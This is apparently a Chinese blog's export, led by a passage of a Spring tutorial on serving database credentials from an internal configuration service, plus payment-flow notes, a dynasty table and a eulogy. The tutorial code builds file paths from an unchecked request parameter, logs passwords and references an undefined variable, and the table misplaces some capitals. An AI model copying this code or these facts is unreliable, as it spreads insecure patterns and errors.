<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># db.properties</span></span><br><span class="line"><span class="attr">jdbc_url</span>=<span class="string">jdbc:mysql://localhost:3306/db?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNull</span></span><br><span class="line"><span class="attr">jdbc_user</span>=<span class="string">username</span></span><br><span class="line"><span class="attr">jdbc_password</span>=<span class="string">password</span></span><br></pre></td></tr></table></figure>

<h2 id="动态加载配置"><a href="#动态加载配置" class="headerlink" title="动态加载配置"></a>动态加载配置</h2><p>为了避免静态加载配置的缺点，我们很自然的想到需要干掉上面的db.properties以及datasource.xml中关于db.properties的配置信息。为了说明动态加载配置，我们将当前这个项目叫做业务项目。</p>
<p>基本思路是将db.properties中的信息放到一个独立于业务项目的地方存放。然后在业务项目启动加载datasource时动态的去这个独立的地方拿db.properties的信息并加载。这样就干掉了db.properties及datasource.xml中的敏感配置项，这就是本文要介绍的__动态加载配置__。上文提到的<code>独立的地方</code>可以是一个独立的项目，如了方便说明实际操作，这里我给这个项目取名为cc项目，取Configuration Center（配置中心）之意。</p>
<p>大致的示意图如下</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1495594711464.png?imageMogr2/thumbnail/300"></p>
<p>下面就来看看具体如何操作</p>
<h3 id="配置中心-cc项目"><a href="#配置中心-cc项目" class="headerlink" title="配置中心:cc项目"></a>配置中心:cc项目</h3><p>cc项目非常容易构建，如果只是为了独立数据库连接配置，那么可以只提供一个接口，在业务项目启动时，请求这个接口来获得数据库连接的敏感配置信息即可。</p>
<h3 id="cc项目中提供敏感配置信息的接口"><a href="#cc项目中提供敏感配置信息的接口" class="headerlink" title="cc项目中提供敏感配置信息的接口"></a>cc项目中提供敏感配置信息的接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigurationController</span> &#123;</span><br><span class="line">  	<span class="comment">//内网配置过访问权限的目录，该目录存放各业务项目的敏感配置</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PREFIX</span> <span class="operator">=</span> <span class="string">&quot;/var/www/cc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/jdbc&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPropertiesByProject</span><span class="params">(Cgi cgi)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">project</span> <span class="operator">=</span> cgi.getString(<span class="string">&quot;project&quot;</span>, <span class="string">&quot;&quot;</span>); <span class="comment">//调用方业务项目名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> cgi.getString(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;&quot;</span>); <span class="comment">//接口调用凭证token</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(PREFIX + <span class="string">&quot;/&quot;</span> + project + <span class="string">&quot;.properties&quot;</span>);</span><br><span class="line">        properties.load(inputStream);</span><br><span class="line">        <span class="keyword">if</span> (properties.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;get properties error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">savedCipher</span> <span class="operator">=</span> properties.getProperty(<span class="string">&quot;cipher&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cipher.isEmpty() || savedCipher.isEmpty() || !cipher.equals(savedCipher)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;authentication is failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbc_url</span> <span class="operator">=</span> properties.getProperty(<span class="string">&quot;jdbc_url&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbc_user</span> <span class="operator">=</span> properties.getProperty(<span class="string">&quot;jdbc_user&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbc_password</span> <span class="operator">=</span> properties.getProperty(<span class="string">&quot;jdbc_password&quot;</span>);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">propertiesJson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        propertiesJson.put(<span class="string">&quot;jdbc_url&quot;</span>, jdbc_url);</span><br><span class="line">        propertiesJson.put(<span class="string">&quot;jdbc_user&quot;</span>, jdbc_user);</span><br><span class="line">        propertiesJson.put(<span class="string">&quot;jdbc_password&quot;</span>, jdbc_password);</span><br><span class="line">        System.out.println(propertiesJson.toString());</span><br><span class="line">        inputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> propertiesJson.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># $&#123;project&#125;.properties 这里的$&#123;project&#125;根据调用的业务系统传入的project参数配置不同读取对应的properties文件</span></span><br><span class="line"><span class="comment"># 内网存储系统(配置过访问权限)中存储的某业务项目的敏感配置信息</span></span><br><span class="line"><span class="attr">token</span>=<span class="string">2^$&gt;[[.34337,8@4</span></span><br><span class="line"><span class="attr">jdbc_url</span>=<span class="string">jdbc:mysql://localhost:3306/db?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNull</span></span><br><span class="line"><span class="attr">jdbc_user</span>=<span class="string">username</span></span><br><span class="line"><span class="attr">jdbc_password</span>=<span class="string">password</span></span><br></pre></td></tr></table></figure>

<h3 id="业务项目加载敏感信息"><a href="#业务项目加载敏感信息" class="headerlink" title="业务项目加载敏感信息"></a>业务项目加载敏感信息</h3><p>业务项目获取敏感信息分两步：1.配置cc项目的接口及参数信息 2.启动时从cc接口加载敏感信息。</p>
<p>还是以加载jdbc数据源为例说明</p>
<ul>
<li>1.配置cc项目的接口及参数信息</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- datasource.xml 配置cc项目提供敏感配置的接口及所需参数信息 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 原加载配置的方式 &lt;context:property-placeholder location=&quot;classpath:conf/db.properties&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 现在注入用于从cc项目拉取配置的类--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;configurationCenterHolder&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;framework.ConfigurationCenterHolder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;locations&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>classpath:conf/cc.properties<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="comment">&lt;!-- 配置cc提供配置的接口信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.DataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 基本属性 url、user、password，使用了形如$&#123;key&#125;的占位符，从cc获取敏感配置后将替换成实际值 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc_url&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc_user&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc_password&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cc.properties</span></span><br><span class="line"><span class="comment"># 这里的cc已经不存在可供外网访问的路由、用户名、密码等敏感信息,所以可以放心配置在项目中</span></span><br><span class="line"><span class="attr">jdbc_url</span>=<span class="string">http\://localhost\:8110/jdbc</span></span><br><span class="line"><span class="attr">project</span>=<span class="string">javavirtual</span></span><br></pre></td></tr></table></figure>

<ul>
<li>2.启动时从cc接口加载敏感信息</li>
</ul>
<p>使用第1步中配置的<code>framework.ConfigurationCenterHolder</code>类，该类继承了spring的<code>PropertyPlaceholderConfigurer</code>类，这是spring中的一个bean工厂后置处理器，重载其processProperties方法可以在程序运行时替换bean配置文件(xml)中用${key}占位的配置项。于是，我们可以结合cc的接口如下来实现动态加载敏感配置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigurationCenterHolder</span> <span class="keyword">extends</span> <span class="title class_">PropertyPlaceholderConfigurer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc_url&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PROJECT</span> <span class="operator">=</span> <span class="string">&quot;project&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">processProperties</span><span class="params">(ConfigurableListableBeanFactory beanFactoryToProcess, Properties props)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//读取cc接口配置</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> props.getProperty(JDBC_URL);</span><br><span class="line">            <span class="type">String</span> <span class="variable">project</span> <span class="operator">=</span> props.getProperty(PROJECT);</span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> initCipher(project);</span><br><span class="line">          	<span class="comment">//请求cc接口获取敏感配置</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">urlStr</span> <span class="operator">=</span> jdbcUrl + <span class="string">&quot;?token=&quot;</span> + URLEncoder.encode(token, <span class="string">&quot;UTF-8&quot;</span>) + <span class="string">&quot;&amp;project=&quot;</span> + project;</span><br><span class="line">            <span class="type">String</span> <span class="variable">responseString</span> <span class="operator">=</span> HttpClientUtil.request(urlStr);</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> JSONObject.parseObject(responseString);</span><br><span class="line">            <span class="comment">//动态加载获取到的敏感配置信息，并填充占位符$&#123;key&#125;</span></span><br><span class="line">            props.setProperty(<span class="string">&quot;jdbc_url&quot;</span>, json.isEmpty() ? <span class="string">&quot;&quot;</span> : (String) json.get(<span class="string">&quot;jdbc_url&quot;</span>));</span><br><span class="line">            props.setProperty(<span class="string">&quot;jdbc_user&quot;</span>, json.isEmpty() ? <span class="string">&quot;&quot;</span> : (String) json.get(<span class="string">&quot;jdbc_user&quot;</span>));</span><br><span class="line">            props.setProperty(<span class="string">&quot;jdbc_password&quot;</span>, json.isEmpty() ? <span class="string">&quot;&quot;</span> : (String) json.get(<span class="string">&quot;jdbc_password&quot;</span>));</span><br><span class="line">            LoggerUtil.info(<span class="string">&quot;init datasource success&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            LoggerUtil.error(<span class="string">&quot;init datasource error&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.processProperties(beanFactoryToProcess, props);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">//从内网存储系统(配置过访问权限)获取cc接口认证token参数</span></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">initCipher</span><span class="params">(String project)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cipherFile</span> <span class="operator">=</span> (SysConfig.DEV ? <span class="string">&quot;/Users/.&quot;</span> : <span class="string">&quot;/home/.&quot;</span>) + project;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cipherFile)), <span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (line.trim().length() == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> line.trim().replaceAll(<span class="string">&quot;\\s+&quot;</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> token;</span><br><span class="line">        &#125;</span><br><span class="line">        reader.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .$&#123;project&#125; 与业务项目名对应的文件，用于存储调用cc接口的token</span></span><br><span class="line"><span class="comment"># 该token与cc接口读取的$&#123;project&#125;.properties文件中的token一致方可通过cc接口认证，成功拿到敏感配置</span></span><br><span class="line"><span class="attr">2^$&gt;[[.34337,8@4</span></span><br></pre></td></tr></table></figure>

<p><strong>注意</strong></p>
<ul>
<li>1.cc项目应该和业务项目部署在同一个内网环境中，并且屏蔽外网对cc项目的访问。这样就完全隔绝的敏感配置信息与外网环境，就算业务项目代码泄漏也不会直接泄漏敏感配置信息。另外敏感信息以及cc接口认证的信息要配置在内网中配置了访问权限的文件中，这样保证了在内网中的只有对应的用户可以访问到对应的敏感文件。</li>
<li>2.这里提供的token认证只是一个示例，实际生产环境汇总可以给cc项目获取敏感配置信息的接口增加一些其他的安全措施来进一步确保安全(e.g. 接口签名)。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，我们就从业务项目中剔除了敏感配置信息，并且可以从cc接口动态加载配置。另外，cc项目的代码中也不存在敏感信息，所以，业务项目和cc项目都是可以公开暴露的，我们只需要在确保内网不能访问cc的接口并且保证内网中存储的敏感配置有权限控制，这样的动态加载配置保证了敏感配置信息是私密的、安全的。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.jobbole.com/111412/">应用敏感信息的 6 个配置原则</a></p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>架构</tag>
        <tag>java</tag>
        <tag>ops</tag>
        <tag>spring</tag>
        <tag>web安全</tag>
        <tag>分布式</tag>
        <tag>配置中心</tag>
      </tags>
  </entry>
  <entry>
    <title>微信APP支付流程</title>
    <url>/technology/2017/08/%E5%BE%AE%E4%BF%A1APP%E6%94%AF%E4%BB%98%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="支付流程"><a href="#支付流程" class="headerlink" title="支付流程"></a>支付流程</h1><blockquote>
<p>流程涉及微信公众平台、微信商户平台、微信开放平台三大平台</p>
</blockquote>
<p><img src="https://pay.weixin.qq.com/wiki/doc/api/img/chapter8_3_1.png"></p>
<h1 id="服务端需要开发三个接口"><a href="#服务端需要开发三个接口" class="headerlink" title="服务端需要开发三个接口"></a>服务端需要开发三个接口</h1><h2 id="一、统一下单接口"><a href="#一、统一下单接口" class="headerlink" title="一、统一下单接口"></a>一、统一下单接口</h2><p>商户后台收到用户支付单，调用微信支付统一下单接口。参见【<a href="https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=9_1">统一下单API</a>】</p>
<h2 id="二、接收支付通知接口"><a href="#二、接收支付通知接口" class="headerlink" title="二、接收支付通知接口"></a>二、接收支付通知接口</h2><p>商户后台接收支付通知。api参见【<a href="https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=9_7">支付结果通知API</a>】</p>
<h2 id="三、查询支付结果的接口"><a href="#三、查询支付结果的接口" class="headerlink" title="三、查询支付结果的接口"></a>三、查询支付结果的接口</h2><p>商户后台查询支付结果。api参见【<a href="https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=9_2">查询订单API</a>】</p>
<blockquote>
<p> 参考github项目<a href="https://github.com/Seanid/wechatPay">https://github.com/Seanid/wechatPay</a></p>
</blockquote>
<h1 id="APP端主要开发调起微信支付的接口"><a href="#APP端主要开发调起微信支付的接口" class="headerlink" title="APP端主要开发调起微信支付的接口"></a>APP端主要开发调起微信支付的接口</h1><p>商户APP调起微信支付。api参见本章节【<a href="https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=8_5">app端开发步骤说明</a>】</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>微信</tag>
        <tag>微信支付</tag>
        <tag>APP</tag>
        <tag>业务</tag>
      </tags>
  </entry>
  <entry>
    <title>历史朝代表</title>
    <url>/%E5%B7%A5%E5%85%B7/2017/01/%E5%8E%86%E5%8F%B2%E6%9C%9D%E4%BB%A3%E8%A1%A8/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>朝 代</th>
<th>起 讫</th>
<th>都 城</th>
<th>今 地</th>
</tr>
</thead>
<tbody><tr>
<td>夏</td>
<td>约前2146-1675年</td>
<td>安邑</td>
<td>山西夏县</td>
</tr>
<tr>
<td><span id="back_1"><a href="#1">[1]</a></span>商</td>
<td>约前1675-1029年</td>
<td>亳</td>
<td>河南商丘</td>
</tr>
<tr>
<td>西周</td>
<td><span id="back_2"><a href="#2">[2]</a></span>约前1029-771年</td>
<td>镐京</td>
<td>陕西西安</td>
</tr>
<tr>
<td>东周</td>
<td>前770-256年</td>
<td>洛邑</td>
<td>河南洛阳</td>
</tr>
<tr>
<td>秦</td>
<td>前221-207年</td>
<td>咸阳</td>
<td>陕西咸阳</td>
</tr>
<tr>
<td><span id="back_3"><a href="#3">[3]</a></span>西汉</td>
<td>前206—公元25</td>
<td>长安</td>
<td>陕西西安</td>
</tr>
<tr>
<td>东汉</td>
<td>25—220</td>
<td>洛阳</td>
<td>河南洛阳</td>
</tr>
<tr>
<td>三国</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>曹魏</td>
<td>220-265</td>
<td>洛阳</td>
<td>河南洛阳</td>
</tr>
<tr>
<td>蜀汉</td>
<td>221-263</td>
<td>成都</td>
<td>四川成都</td>
</tr>
<tr>
<td>孙吴</td>
<td>222-280</td>
<td>建业</td>
<td>江苏南京</td>
</tr>
<tr>
<td>晋</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>西晋</td>
<td>265-317</td>
<td>洛阳</td>
<td>河南洛阳</td>
</tr>
<tr>
<td>东晋</td>
<td>317-420</td>
<td>建康</td>
<td>江苏南京</td>
</tr>
<tr>
<td><span id="back_4"><a href="#4">[4]</a></span>十六国</td>
<td>304-439</td>
<td>—</td>
<td>—</td>
</tr>
<tr>
<td>南朝</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>宋</td>
<td>420-479</td>
<td>建康</td>
<td>江苏南京</td>
</tr>
<tr>
<td>齐</td>
<td>479-502</td>
<td>建康</td>
<td>江苏南京</td>
</tr>
<tr>
<td>梁</td>
<td>502-557</td>
<td>建康</td>
<td>江苏南京</td>
</tr>
<tr>
<td>陈</td>
<td>557-589</td>
<td>建康</td>
<td>江苏南京</td>
</tr>
<tr>
<td>北朝</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>北魏</td>
<td>386-534</td>
<td>平城</td>
<td>河南洛阳</td>
</tr>
<tr>
<td>东魏</td>
<td>534-550</td>
<td>邺</td>
<td>河北临漳</td>
</tr>
<tr>
<td>北齐</td>
<td>550-577</td>
<td>邺</td>
<td>河北临漳</td>
</tr>
<tr>
<td>西魏</td>
<td>535-557</td>
<td>长安</td>
<td>陕西西安</td>
</tr>
<tr>
<td>北周</td>
<td>557-581</td>
<td>长安</td>
<td>陕西西安</td>
</tr>
<tr>
<td>隋</td>
<td>581-618</td>
<td>大兴</td>
<td>陕西西安</td>
</tr>
<tr>
<td>唐</td>
<td>618-907</td>
<td>长安</td>
<td>陕西西安</td>
</tr>
<tr>
<td>五代十国</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>后梁</td>
<td>907-923</td>
<td>汴</td>
<td>河南洛阳</td>
</tr>
<tr>
<td>后唐</td>
<td>923-936</td>
<td>汴</td>
<td>河南洛阳</td>
</tr>
<tr>
<td>后晋</td>
<td>936-946</td>
<td>汴</td>
<td>河南开封</td>
</tr>
<tr>
<td>后汉</td>
<td>947-950</td>
<td>汴</td>
<td>河南开封</td>
</tr>
<tr>
<td>后周</td>
<td>951-960</td>
<td>汴</td>
<td>河南开封</td>
</tr>
<tr>
<td><span id="back_5"><a href="#5">[5]</a></span>十国</td>
<td>902-979</td>
<td>—</td>
<td>—</td>
</tr>
<tr>
<td>宋</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>北宋</td>
<td>960-1127</td>
<td>开封</td>
<td>河南开封</td>
</tr>
<tr>
<td>南宋</td>
<td>1127-1279</td>
<td>临安</td>
<td>浙江杭州</td>
</tr>
<tr>
<td>辽</td>
<td>907-1125</td>
<td>皇都(上京)</td>
<td>内蒙古 巴林左旗</td>
</tr>
<tr>
<td>大理</td>
<td>937-1254</td>
<td>太和城</td>
<td>云南大理</td>
</tr>
<tr>
<td>西夏</td>
<td>1038-1227</td>
<td>兴庆府</td>
<td>宁夏银川</td>
</tr>
<tr>
<td>金</td>
<td>1115-1234</td>
<td>会宁</td>
<td>阿城(黑龙江)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>中都</td>
<td>北京</td>
</tr>
<tr>
<td></td>
<td></td>
<td>开封</td>
<td>河南开封</td>
</tr>
<tr>
<td>明</td>
<td>1368-1644</td>
<td>北京</td>
<td>北京</td>
</tr>
<tr>
<td>清</td>
<td>1616-1911</td>
<td>北京</td>
<td>北京</td>
</tr>
<tr>
<td>中华民国</td>
<td>1912-1949</td>
<td>南京</td>
<td>江苏南京</td>
</tr>
<tr>
<td><strong>中华人民共和国</strong></td>
<td><strong>1949-10-01</strong></td>
<td><strong>北京</strong></td>
<td><strong>北京</strong></td>
</tr>
</tbody></table>
<blockquote>
<p>附注：</p>
</blockquote>
<ol>
<li><span id="1"><a href="#back_1">[1]</a></span>约公元前14世纪盘庚迁都于殷，此后商也成为殷。</li>
<li><span id="2"><a href="#back_2">[2]</a></span>公元前841年(西周共和元年)为中国历史确切纪年的开始。</li>
<li><span id="3"><a href="#back_3">[3]</a></span>包括王莽建立的”新”王朝(公元8年—23年)。王莽时期，爆发大规模的农民起义，建立了农民政权。公元23年，新王莽政权灭亡。公元25年，东汉王朝建立。</li>
<li><span id="4"><a href="#back_4">[4]</a></span>这时期，在我国北方，先后存在过一些封建政权，其中有：汉(前赵)、成(成汉)、前凉、后赵(魏)、前燕、前秦、后燕、后秦、西秦、后凉、南凉、北凉、南燕、西凉、北燕、夏等国，历史上叫做”十六国”。</li>
<li><span id="5"><a href="#back_5">[5]</a></span>这时期，除后梁、后唐、后晋、后汉、后周外，还先后存在过一些封建政权，其中有：吴、前蜀、吴越、楚、闽、南汉、荆南(南平)、后蜀、南唐、北汉等国，历史上叫做”十国”。 |</li>
</ol>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>历史</tag>
        <tag>朝代</tag>
      </tags>
  </entry>
  <entry>
    <title>悼念我的外公</title>
    <url>/%E7%94%9F%E6%B4%BB/2019/02/%E6%82%BC%E5%BF%B5%E6%88%91%E7%9A%84%E5%A4%96%E5%85%AC/</url>
    <content><![CDATA[<p>我的外公，我叫他大爹（方言，外婆称作细爹）。</p>
<p>2019年大年初七，是我在老家过完春节返杭工作，也是大爹去世的日子。下午细爹还平静地打电话问候我返杭归途是否顺利（这是我唯一一次没有在电话里问起大爹），不料晚上就收到大爹突然去世的噩耗。</p>
<p>没想到正月初二不经意间一个告别就成了永别，回想起来恍然如梦，不知所措——临走那天只是出门前草草一句“大爹，我走了”，总想着这次的告别实在是太草率了。 这是大爹唯一一次没有出来目送我。大爹啊：您是这世上最关心我的人，如果可以，我多希望我可以再多叫您几声大爹；陪您看看电视、打打牌。可惜没有如果，您今后就成了我的回忆了。</p>
<p>大爹是个农民，和他们那个年代每一个农民一样，勤劳周转，有做不完的农活和家事。他一生最重要的事情就是养育了三个孩子（我的母亲和两位舅舅），现在他老人家去世成了他的三个孩子最悲痛的事情。</p>
<p>大爹他还是一位赤脚医生，家里来看病的乡亲常常络绎不绝，格外热闹；外出去问诊的时候总是面带笑意，精神抖擞。大家都亲切地叫他李医师。他老人家是突发心肌梗塞抢救无效去世的，之前还中过风，都说医者不能自医，但他是知道自己身体情况的，但就是怕身边的人担心，所以不说，连最后细爹要去找舅舅抢救时他都试图阻止。宅心仁厚的李医师离开了，来送他的人七天不断。</p>
<p>大爹是我见过最聪明坚韧却又最谦逊亲和而无私的人。他曾带我在田间种豆，一罐豆种，一把小锄头，松土，下种，流汗；带我割猪草，一刀一刀切碎，混着菜叶剩饭和糠喂给猪猡；教我认中草药，亲手挑选小片的甘草给我试吃；带我熏腊肉，厨房里的火灶，干柴塞进去，火苗闪耀，松枝和灌木发出噼啪脆裂声音，干柴烧完后的灶灰还有着热力，这时把收好的红薯和糯米罐子深埋进灶灰里，焐一个晚上。早上取出红薯和陶罐，红薯烂熟而糯米糊温热黏稠，纷纷经过喉咙落入胃里，绵密妥帖，我最爱吃；辛苦几十天熏好的腊肉会在春节分发给亲戚，大家都爱吃，只要是大家爱吃的，他就不辞辛劳地为大家争取。</p>
<p>花开到尽头就要谢下来，但来年还会复活。人死去之后，会有轮回。按照佛教的说法，叶缘流转，哪怕我们自己不愿意，都还是要再回到另一个躯体里重新做人。而能否得到人身尚且还是一件极不易的事。这是为了让我们对生命有敬畏。世间上的缘分因果相续，任何事情都有回报。生命不是能够为所欲为的事，它也不由我们控制。</p>
<p>任何人都只能陪我们走一段路，因此这一段路我们更要加倍珍惜、慎重对待。大爹匆匆离世让我不得不重新审视在杭工作是否妥帖。都说子欲孝而亲不在，如果在外赚钱是为了孝敬父母；是为了有能力去关心亲爱的人，那在物理距离上远离他们难道不是一种南辕北辙的做法？起码我们确实少了许多陪伴亲人的时间，而时间是沉没成本（流失了就再也无法回收），逻辑上看来，的确是得不偿失！虽然现阶段我还不能马上回到家乡，但我仍须要坚持做正确的事情——常回家看看。</p>
<p>最后，大爹：那些您骑着二八大杠带着我，我坐在杠上去闻诊的春天；那些您脚踩淤泥为我和妹妹采莲蓬的夏天；那些和您一起用连枷打谷的秋天；那些您站在路边翘首期盼我寒假归来的冬天；我还有好多话想和您细说，却只能止笔于此。我最敬爱的大爹，我会常回来看细爹的，虽然不能像您一样和她拌嘴；我会照顾好妈妈，就像您百般疼爱她一样（您要是还在，一定会叫她改改臭脾气，对家人多些包容，她只听您的，而您是希望家人和睦团结的，对吧？希望她看到这多想想您，想想您的期望）。大爹，您安心地走吧，我们会好好生活的。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>外公</tag>
        <tag>大爹</tag>
        <tag>葬礼</tag>
        <tag>亲情</tag>
      </tags>
  </entry>
  <entry>
    <title>支付宝APP支付流程</title>
    <url>/technology/2017/08/%E6%94%AF%E4%BB%98%E5%AE%9DAPP%E6%94%AF%E4%BB%98%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="支付能力申请流程"><a href="#支付能力申请流程" class="headerlink" title="支付能力申请流程"></a>支付能力申请流程</h1><h2 id="一、注册支付宝开放平台"><a href="#一、注册支付宝开放平台" class="headerlink" title="一、注册支付宝开放平台"></a>一、注册支付宝开放平台</h2><p>支付宝开放平台使用支付宝账号。</p>
<p>如果是支付能力开发商，建议使用企业邮箱注册。</p>
